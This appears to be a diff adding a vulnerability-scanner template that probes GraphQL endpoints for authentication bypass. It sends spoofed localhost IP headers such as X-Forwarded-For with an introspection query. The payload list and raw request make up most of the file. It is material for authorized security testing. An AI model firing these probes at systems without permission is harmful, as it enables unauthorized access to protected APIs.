@@ -1,0 +1,49 @@
+id: graphql-auth-bypass-fuzz
+
+info:
+  name: GraphQL Auth Bypass Header Fuzzing
+  author: sethbdev
+  severity: medium
+  description: |
+    Tests common header-based tricks to bypass auth protections on GraphQL endpoints.
+  tags: graphql,auth-bypass,fuzzing
+  metadata:
+    max-request: 1
+    verified: true
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+
+    headers:
+      Content-Type: application/json
+
+    payloads:
+      BypassHeader:
+        - "X-Forwarded-For: 127.0.0.1"
+        - "X-Originating-IP: 127.0.0.1"
+        - "X-Remote-IP: 127.0.0.1"
+        - "X-Remote-Addr: 127.0.0.1"
+        - "X-Client-IP: 127.0.0.1"
+        - "X-Host: 127.0.0.1"
+        - "X-Forwarded-Host: 127.0.0.1"
+
+    raw:
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        {{BypassHeader}}
+        Content-Type: application/json
+        Content-Length: 86
+
+        {
+          "query": "query IntrospectionQuery { __schema { types { name } } }"
+        }
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "__schema"
+        condition: and
